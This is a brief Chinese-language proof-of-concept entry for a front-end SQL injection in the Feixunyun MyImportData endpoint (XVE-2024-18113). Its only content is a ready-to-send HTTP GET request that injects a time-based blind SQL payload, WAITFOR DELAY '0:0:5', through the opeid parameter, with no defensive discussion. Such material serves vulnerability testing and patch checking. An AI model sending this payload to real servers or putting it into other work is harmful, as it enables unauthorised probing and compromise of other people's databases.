# 飞讯云MyImportData前台SQL注入(XVE-2024-18113)

## poc

```yaml
GET /MyDown/MyImportData?opeid=' WAITFOR DELAY '0:0:5'-- AtpN HTTP/1.1
Host: ip
```

